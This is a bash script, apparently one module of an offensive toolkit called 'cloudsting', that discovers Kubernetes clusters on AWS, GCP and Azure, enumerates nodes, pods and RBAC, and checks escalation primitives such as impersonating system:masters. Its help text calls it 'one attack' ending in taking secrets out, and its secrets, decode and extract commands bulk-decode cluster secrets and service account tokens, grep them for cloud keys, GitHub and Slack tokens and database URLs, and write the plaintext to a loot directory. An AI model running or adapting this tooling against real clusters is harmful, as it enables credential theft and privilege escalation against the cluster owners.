#!/usr/bin/env bash
# 16_kubernetes.sh — cloudsting module 16: Kubernetes, from cluster discovery to secrets in hand
# Verbs: --clusters | --nodes | --pods | --rbac | --abuse | --secrets | --extract | --decode | --sa-tokens | --kubeconfig | --all | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file after the core is sourced. An inherited
# CS_MOD_DIR is a caller's directory, not this module's.
unset CS_MOD_DIR

# The shared core owns the root, the loot tree, the run id, the TSV writer,
# the three-state provider gate, redaction, the findings store and the
# selftest ledger.
MODULE_ID="16_kubernetes"
MOD_NAME="Kubernetes (clusters → RBAC → secrets)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

K8_RUN_ID="$CS_RUN_ID"
export K8_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/kubernetes"
mkdir -p "$OUT_DIR" 2>/dev/null || true

CLUSTER_FILE="$OUT_DIR/clusters-$RUN_ID.tsv"
SECRET_FILE="$OUT_DIR/secrets-$RUN_ID.tsv"
ABUSE_FILE="$OUT_DIR/abuse-$RUN_ID.tsv"

: "${K8_TIMEOUT:=15}"   # per kubectl call
: "${K8_MAX_DECODE:=64}" # secrets decoded in one --extract sweep

k8_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── gates ────────────────────────────────────────────────────────
k8_has_kubectl() { command -v kubectl >/dev/null 2>&1; }
k8_has_aws() { command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; }
k8_has_gcp() { command -v gcloud >/dev/null 2>&1 && gcloud config get-value project >/dev/null 2>&1; }
k8_has_az()  { command -v az >/dev/null 2>&1 && az account show >/dev/null 2>&1; }

# kubectl that never hangs and never prompts
k8_k() { kubectl --request-timeout="${K8_TIMEOUT}s" "$@" 2>/dev/null; }

# Do I have working in-cluster rights? Three states, always.
k8_access_state() {
    k8_has_kubectl || { printf 'kubectl-missing'; return 0; }
    local ctx; ctx="$(kubectl config current-context 2>/dev/null)"
    [[ -z "$ctx" ]] && { printf 'no-context'; return 0; }
    if kubectl auth can-i list pods >/dev/null 2>&1; then
        printf 'kubectl-active'
    else
        printf 'kubectl-no-access'
    fi
}

# ── cluster discovery ────────────────────────────────────────────
# A managed cluster is a cloud resource with an API server attached, so it
# is found with the cloud CLI, not with kubectl.
k8_clusters_aws() {
    k8_has_aws || return 0
    aws eks list-clusters --output json 2>/dev/null | jq -r '.clusters[]?' 2>/dev/null | \
        while IFS= read -r name; do
            [[ -z "$name" ]] && continue
            local info; info="$(aws eks describe-cluster --name "$name" --output json 2>/dev/null)"
            printf 'aws-eks\t%s\t%s\t%s\t%s\t%s\n' \
                "$name" \
                "$(printf '%s' "$info" | jq -r '.cluster.version // "-"')" \
                "$(printf '%s' "$info" | jq -r '.cluster.status // "-"')" \
                "$(printf '%s' "$info" | jq -r '.cluster.endpoint // "-"')" \
                "$(printf '%s' "$info" | jq -r '.cluster.resourcesVpcConfig.endpointPublicAccess // "-"')"
        done
}

k8_clusters_gcp() {
    k8_has_gcp || return 0
    local project; project="$(gcloud config get-value project 2>/dev/null)"
    [[ -z "$project" || "$project" == "(unset)" ]] && return 0
    gcloud container clusters list --project "$project" \
        --format='csv[no-heading](NAME,LOCATION,STATUS,MASTER_VERSION,ENDPOINT)' 2>/dev/null | \
        while IFS=, read -r name loc status ver endpoint; do
            [[ -z "$name" ]] && continue
            printf 'gcp-gke\t%s\t%s\t%s\t%s\t-\n' "$name" "${ver:--}" "${status:--}" "${endpoint:--}"
        done
}

k8_clusters_az() {
    k8_has_az || return 0
    az aks list --output json 2>/dev/null | \
        jq -r '.[]? | ["az-aks", .name, (.kubernetesVersion // "-"), (.powerState.code // "-"), (.fqdn // "-"), "-"] | @tsv' 2>/dev/null
}

k8_cmd_clusters() {
    : > "$CLUSTER_FILE"
    local line n=0
    for collector in k8_clusters_aws k8_clusters_gcp k8_clusters_az; do
        local out; out="$("$collector")"
        [[ -z "$out" ]] && continue
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            n=$((n + 1))
            cs_row CLUSTER "$line"
            printf '%s\n' "$line" >> "$CLUSTER_FILE"
            # A publicly reachable API server is the thing worth noticing.
            local endpoint
            endpoint="$(printf '%s' "$line" | awk -F'\t' '{print $5}')"
            case "$endpoint" in
                https://*)
                    cs_findings_row "$MODULE_ID" "SURFACE" "$endpoint" "MEDIUM" "k8s-api-public" \
                        "managed cluster API server is reachable at a public endpoint"
                    ;;
            esac
        done <<< "$out"
    done

    if [[ "$n" -eq 0 ]]; then
        cs_row PROVIDER all absent "no cloud credentials or no managed clusters"
    fi
    cs_row SUMMARY "$n"
    [[ "$n" -gt 0 ]] && cs_row ARTIFACT "$CLUSTER_FILE"
    return 0
}

# kubectl config is itself a finding: a kubeconfig with cluster-admin and a
# static token in it is an entire cluster in one file.
k8_cmd_kubeconfig() {
    local cfg="${KUBECONFIG:-$HOME/.kube/config}"
    if [[ ! -r "$cfg" ]]; then
        cs_row KUBECONFIG "$cfg" "absent"
        return 0
    fi
    cs_row KUBECONFIG "$cfg" "readable"
    cs_row CONTEXT "$(kubectl config current-context 2>/dev/null || printf 'none')"

    local n=0 name server user
    while IFS=$'\t' read -r name server; do
        [[ -z "$name" || "$name" == "NAME" ]] && continue
        n=$((n + 1))
        cs_row CLUSTER_ENTRY "$name" "$server"
    done < <(kubectl config get-clusters 2>/dev/null | awk '{printf "%s\t%s\n", $1, $2}')

    while IFS= read -r user; do
        [[ -z "$user" || "$user" == "NAME" ]] && continue
        cs_row USER_ENTRY "$user"
    done < <(kubectl config get-users 2>/dev/null)

    cs_row SUMMARY "$n"
    cs_findings_row "$MODULE_ID" "IDENTITY" "$cfg" "HIGH" "kubeconfig-present" \
        "a kubeconfig with an active context is readable"
    return 0
}

# ── in-cluster surface ───────────────────────────────────────────
k8_cmd_nodes() {
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }
    local out; out="$(k8_k get nodes -o json)"
    [[ -z "$out" ]] && { cs_row VERDICT "no-nodes" "no cluster access"; return 0; }
    printf '%s' "$out" | jq -r '.items[]? |
        [ .metadata.name,
          (.status.nodeInfo.kubeletVersion // "-"),
          (.status.nodeInfo.osImage // "-"),
          (.status.nodeInfo.containerRuntimeVersion // "-"),
          (.spec.taints // [] | length | tostring),
          (if .status.conditions[]? | select(.type=="Ready") | .status == "True" then "ready" else "not-ready" end)
        ] | @tsv' 2>/dev/null | while IFS=$'\t' read -r name ver os rt taints ready; do
            cs_row NODE "$name" "$ver" "$os" "$rt" "$ready"
        done
    return 0
}

k8_cmd_pods() {
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }
    local out; out="$(k8_k get pods -A -o json)"
    [[ -z "$out" ]] && { cs_row VERDICT "no-pods" "no cluster access"; return 0; }
    printf '%s' "$out" | jq -r '.items[]? |
        [ .metadata.namespace,
          .metadata.name,
          (.spec.nodeName // "-"),
          (.status.containerStatuses[0].image // "-"),
          (.status.phase // "-"),
          (.spec.hostNetwork // false | tostring),
          (.spec.hostPID // false | tostring)
        ] | @tsv' 2>/dev/null | while IFS=$'\t' read -r ns name node image phase hostnet hostpid; do
            cs_row POD "$ns" "$name" "$node" "$image" "$phase"
            # A pod on the host namespace is a node compromise already staged.
            if [[ "$hostnet" == "true" || "$hostpid" == "true" ]]; then
                cs_findings_row "$MODULE_ID" "EXPOSURE" "$ns/$name" "HIGH" "pod-host-namespace" \
                    "pod shares the host network or PID namespace"
            fi
        done
    return 0
}

# ── RBAC ─────────────────────────────────────────────────────────
# Role rules are where privilege escalation lives: a rule that can create
# pods, bind roles or read secrets is a path to the cluster.
k8_cmd_rbac() {
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }
    local out; out="$(k8_k get clusterroles -o json)"
    if [[ -n "$out" ]]; then
        printf '%s' "$out" | jq -r '.items[]? |
            select(.rules != null) |
            [ .metadata.name,
              ([.rules[] | (.resources // [])[]] | unique | join(",")),
              ([.rules[] | (.verbs // [])[]] | unique | join(","))
            ] | @tsv' 2>/dev/null | head -n 200 | \
        while IFS=$'\t' read -r role resources verbs; do
            cs_row ROLE "$role" "$resources" "$verbs"
            # the classic escalation pair
            if [[ "$verbs" == *"*"* ]] && [[ "$resources" == *"*"* ]]; then
                cs_findings_row "$MODULE_ID" "IDENTITY" "$role" "CRITICAL" "cluster-admin-wildcard" \
                    "ClusterRole grants every verb on every resource"
            fi
        done
    fi

    out="$(k8_k get clusterrolebindings -o json)"
    if [[ -n "$out" ]]; then
        printf '%s' "$out" | jq -r '.items[]? |
            [ .metadata.name, .roleRef.name, ([.subjects[]?.name // "-"] | join(",")) ] | @tsv' 2>/dev/null | \
        while IFS=$'\t' read -r binding role subjects; do
            cs_row BINDING "$binding" "$role" "$subjects"
        done
    fi

    # What can the current identity do?
    local check verb resource result
    for check in "list secrets" "get secrets" "create pods" "create deployments" \
                 "create rolebindings" "create clusterrolebindings" "create serviceaccounts" \
                 "impersonate users" "impersonate groups" "escalate clusterroles"; do
        verb="${check%% *}"; resource="${check#* }"
        result="$(kubectl auth can-i "$verb" "$resource" 2>/dev/null)"
        result="${result:-unknown}"
        cs_row CAN "$check" "$result"
    done
    return 0
}

# The escalation checklist: only the primitives that actually get you further,
# each one named with the role that grants it.
k8_cmd_abuse() {
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }
    : > "$ABUSE_FILE"
    local n=0 check verb resource result why
    while IFS=$'\t' read -r check why; do
        verb="${check%% *}"; resource="${check#* }"
        result="$(kubectl auth can-i "$verb" "$resource" 2>/dev/null)"
        [[ "$result" != "yes" ]] && continue
        n=$((n + 1))
        cs_row ABUSE "$check" "$why"
        printf '%s\t%s\n' "$check" "$why" >> "$ABUSE_FILE"
        cs_findings_row "$MODULE_ID" "IDENTITY" "$check" "HIGH" "k8s-rbac-abuse" \
            "current identity can $check ($why)"
    done <<'ABUSE'
list secrets	every secret in every namespace
get secrets	read individual secret values
create pods	a pod of my choosing, with a service account I choose
create deployments	persistent pod creation through the controller
create rolebindings	grant any role I hold to any subject
create clusterrolebindings	cluster-wide grant
create serviceaccounts	mint an identity
create clusterroles	define a new role
impersonate users	act as any user
impersonate groups	act as system:masters
escalate clusterroles	grant roles I do not hold
patch clusterrolebindings	rewrite an existing grant
ABUSE
    cs_row SUMMARY "$n"
    [[ "$n" -gt 0 ]] && cs_row ARTIFACT "$ABUSE_FILE"
    return 0
}

# ── secrets ──────────────────────────────────────────────────────
# Listing what exists is recon; reading what it says is the find. Both here.
k8_cmd_secrets() {
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }
    local out; out="$(k8_k get secrets -A -o json)"
    [[ -z "$out" ]] && { cs_row VERDICT "no-secret-access" "kubectl cannot list secrets"; return 0; }
    : > "$SECRET_FILE"
    local n=0
    printf '%s' "$out" | jq -r '.items[]? |
        [ .metadata.namespace, .metadata.name, (.type // "Opaque"),
          (.data // {} | keys | join(",")) ] | @tsv' 2>/dev/null | \
    while IFS=$'\t' read -r ns name type keys; do
        n=$((n + 1))
        cs_row SECRET "$ns" "$name" "$type" "$keys"
        printf '%s\t%s\t%s\t%s\n' "$ns" "$name" "$type" "$keys" >> "$SECRET_FILE"
    done
    local count; count="$(wc -l < "$SECRET_FILE" 2>/dev/null | tr -d ' ')"
    cs_row COUNT "${count:-0}"
    if [[ "${count:-0}" -gt 0 ]]; then
        cs_row ARTIFACT "$SECRET_FILE"
        cs_findings_row "$MODULE_ID" "CREDS" "cluster" "HIGH" "k8s-secrets-readable" \
            "${count} secrets are readable from the current identity"
    fi
    return 0
}

# Decode one secret: base64 out, plaintext shown redacted, full value to loot.
k8_cmd_decode() {
    local ns="${1:-}" name="${2:-}"
    if [[ -z "$ns" || -z "$name" ]]; then
        k8_log "usage: --decode <namespace> <secret-name>"
        return 2
    fi
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }

    local out; out="$(k8_k get secret "$name" -n "$ns" -o json)"
    [[ -z "$out" ]] && { cs_row VERDICT "not-found" "$ns" "$name"; return 0; }

    local safe="$OUT_DIR/secret-$ns-$name-$RUN_ID.txt"
    : > "$safe"
    chmod 600 "$safe" 2>/dev/null || true

    printf '%s' "$out" | jq -r '.data // {} | to_entries[]? | [.key, (.value | @base64d)] | @tsv' 2>/dev/null | \
    while IFS=$'\t' read -r key value; do
        [[ -z "$key" ]] && continue
        printf '%s\t%s\n' "$key" "$value" >> "$safe"
        cs_row KEY "$key" "$(cs_redact "$value")"
        if printf '%s' "$value" | grep -qE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|-----BEGIN|sk_live_|gh[pousr]_[A-Za-z0-9]{20,}|xox[baprs]-'; then
            cs_findings_row "$MODULE_ID" "CREDS" "$ns/$name" "CRITICAL" "k8s-secret-credential" \
                "secret $ns/$name carries a usable credential in key $key"
        fi
    done
    cs_row ARTIFACT "$safe"
    return 0
}

# Service account tokens: the Kubernetes identity that works outside the
# cluster and often never expires.
k8_cmd_sa_tokens() {
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }
    local out; out="$(k8_k get secrets -A -o json)"
    [[ -z "$out" ]] && { cs_row VERDICT "no-access" "kubectl cannot list secrets"; return 0; }

    local n=0
    printf '%s' "$out" | jq -r '.items[]? |
        select(.type == "kubernetes.io/service-account-token") |
        [ .metadata.namespace, .metadata.name,
          (.metadata.annotations["kubernetes.io/service-account.name"] // "-"),
          (.data.token != null | tostring) ] | @tsv' 2>/dev/null | \
    while IFS=$'\t' read -r ns name sa has; do
        [[ -z "$ns" ]] && continue
        n=$((n + 1))
        cs_row SA_TOKEN "$ns" "$name" "$sa" "$has"
        [[ "$has" == "true" ]] && cs_findings_row "$MODULE_ID" "CREDS" "$ns/$name" "CRITICAL" "k8s-sa-token" \
            "service account token for $sa is readable"
    done
    return 0
}

# The whole sweep in one verb: secrets, decode the interesting ones, and the
# RBAC checklist that says how far it goes.
k8_cmd_extract() {
    local ns="${1:-}"
    local -a nsflag=(-A)
    [[ -n "$ns" ]] && nsflag=(-n "$ns")
    k8_has_kubectl || { cs_row PROVIDER kubectl absent "kubectl not installed"; return 0; }

    local out; out="$(k8_k get secrets "${nsflag[@]}" -o json)"
    [[ -z "$out" ]] && { cs_row VERDICT "no-secret-access"; return 0; }

    : > "$SECRET_FILE"
    local safe="$OUT_DIR/extract-$RUN_ID.tsv"
    : > "$safe"; chmod 600 "$safe" 2>/dev/null || true

    local decoded=0 found=0
    while IFS=$'\t' read -r nspace name type keys; do
        [[ -z "$name" ]] && continue
        found=$((found + 1))
        cs_row SECRET "$nspace" "$name" "$type" "$keys"
        printf '%s\t%s\t%s\t%s\n' "$nspace" "$name" "$type" "$keys" >> "$SECRET_FILE"

        [[ "$decoded" -ge "$K8_MAX_DECODE" ]] && continue
        [[ "$type" == "kubernetes.io/service-account-token" ]] && continue

        # only decode what is likely to hold something useful
        case "$keys" in
            *token*|*password*|*secret*|*key*|*credential*|*api*|*config*) ;;
            *) continue ;;
        esac
        decoded=$((decoded + 1))

        k8_k get secret "$name" -n "$nspace" -o json | \
            jq -r '.data // {} | to_entries[]? | [.key, (.value | @base64d)] | @tsv' 2>/dev/null | \
        while IFS=$'\t' read -r key value; do
            [[ -z "$key" ]] && continue
            printf '%s/%s\t%s\t%s\n' "$nspace" "$name" "$key" "$value" >> "$safe"
            cs_row VALUE "$nspace/$name" "$key" "$(cs_redact "$value")"
            if printf '%s' "$value" | grep -qE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|-----BEGIN|sk_live_|gh[pousr]_|xox[baprs]-|postgres://|mysql://|mongodb://'; then
                cs_findings_row "$MODULE_ID" "CREDS" "$nspace/$name" "CRITICAL" "k8s-secret-credential" \
                    "decoded secret carries a credential in key $key"
            fi
        done
    done < <(printf '%s' "$out" | jq -r '.items[]? |
        [ .metadata.namespace, .metadata.name, (.type // "Opaque"),
          (.data // {} | keys | join(",")) ] | @tsv' 2>/dev/null)

    cs_row COUNT "$found"
    cs_row DECODED "$decoded"
    cs_row ARTIFACT "$safe"
    [[ "$found" -gt 0 ]] && cs_findings_row "$MODULE_ID" "CREDS" "cluster" "HIGH" \
        "k8s-secrets-readable" "$found secrets readable, $decoded decoded"
    return 0
}

k8_cmd_list() {
    cs_row GROUP "cluster-surface" "clusters nodes pods kubeconfig"
    cs_row GROUP "identity" "rbac abuse sa-tokens"
    cs_row GROUP "custody" "secrets decode extract"
    return 0
}

k8_cmd_all() {
    k8_cmd_clusters
    k8_cmd_kubeconfig
    k8_cmd_nodes
    k8_cmd_pods
    k8_cmd_rbac
    k8_cmd_abuse
    k8_cmd_extract
    return 0
}

k8_cmd_status_tsv() {
    local access cloud=""
    access="$(k8_access_state)"
    k8_has_aws && cloud="${cloud}aws "
    k8_has_gcp && cloud="${cloud}gcp "
    k8_has_az  && cloud="${cloud}az "
    printf '%s\t%s\t%s\tcloud-%s\n' "$MODULE_ID" "$MOD_NAME" "$access" "${cloud:-none}"
}

k8_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

k8_cmd_help() {
    cat <<'HELP'
cloudsting module 16 — Kubernetes v1.0.0
  --clusters               find managed clusters (EKS, GKE, AKS)
  --kubeconfig             read the kubeconfig: contexts, clusters, users
  --nodes                  list nodes with version and readiness
  --pods                   list every pod, all namespaces
  --rbac                   cluster roles, bindings, and what I can do
  --abuse                  the escalation checklist, names only yes
  --secrets                list secrets across namespaces
  --decode <ns> <secret>   decode one secret's keys
  --sa-tokens              service account tokens, the non-expiring identity
  --extract [namespace]    sweep secrets and decode the interesting ones
  --all                    the whole chain
  --list                   the surface, grouped by job
  --status-tsv             module status
  --menu                   menu entry
  --selftest               run selftests
  --help                   this message

Sixteen mapped the cluster, seventeen mined it. They are one attack in two
halves: find the cluster, then find the identity that reads it, then take the
secrets out. --abuse only prints a line when kubectl answers yes, so an empty
result is an answer, not a failure. Secret values never reach stdout in full;
the redacted form is shown and the real value lands in loot/kubernetes/ mode
600.

Environment: K8_TIMEOUT (15), K8_MAX_DECODE (64)
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
k8_selftest() {
    cs_selftest_reset

    # access state is always one of the four known answers, never empty
    chk access-state "$(k8_access_state | grep -cE '^(kubectl-missing|no-context|kubectl-active|kubectl-no-access)$')" "1"

    # cluster collectors answer without credentials instead of crashing
    local out
    out="$(k8_cmd_clusters 2>/dev/null)"
    chk clusters-runs "$(printf '%s' "$out" | awk -F'\t' 'NF<2{c++} END{print c+0}')" "0"
    chk clusters-summary "$(printf '%s' "$out" | grep -c '^SUMMARY')" "1"

    # every in-cluster verb degrades to a PROVIDER row when kubectl is absent
    if k8_has_kubectl; then
        chk nodes-shape "$(k8_cmd_nodes 2>/dev/null | awk -F'\t' 'NF<2{c++} END{print c+0}')" "0"
    else
        chk nodes-absent "$(k8_cmd_nodes 2>/dev/null | grep -c '^PROVIDER')" "1"
        chk pods-absent  "$(k8_cmd_pods  2>/dev/null | grep -c '^PROVIDER')" "1"
        chk rbac-absent  "$(k8_cmd_rbac  2>/dev/null | grep -c '^PROVIDER')" "1"
        chk abuse-absent "$(k8_cmd_abuse 2>/dev/null | grep -c '^PROVIDER')" "1"
    fi

    # usage errors
    local rc
    k8_cmd_decode 2>/dev/null; rc=$?
    chk decode-usage "$rc" "2"

    # shape contracts
    chk status-fields "$(k8_cmd_status_tsv | awk -F'\t' '{print NF}')" "4"
    chk status-module "$(k8_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(k8_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(k8_cmd_help | head -1 | grep -ci 'Kubernetes')" "1"
    chk list-groups   "$(k8_cmd_list | grep -c '^GROUP')" "3"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --clusters)   shift; k8_cmd_clusters "$@";;
    --kubeconfig) shift; k8_cmd_kubeconfig "$@";;
    --nodes)      shift; k8_cmd_nodes "$@";;
    --pods)       shift; k8_cmd_pods "$@";;
    --rbac)       shift; k8_cmd_rbac "$@";;
    --abuse)      shift; k8_cmd_abuse "$@";;
    --secrets)    shift; k8_cmd_secrets "$@";;
    --decode)     shift; k8_cmd_decode "$@";;
    --sa-tokens)  shift; k8_cmd_sa_tokens "$@";;
    --extract)    shift; k8_cmd_extract "$@";;
    --all)        k8_cmd_all;;
    --list)       k8_cmd_list;;
    --status-tsv|--status) k8_cmd_status_tsv;;
    --menu)       k8_cmd_menu;;
    --selftest)   k8_selftest;;
    *)            k8_cmd_help;;
esac
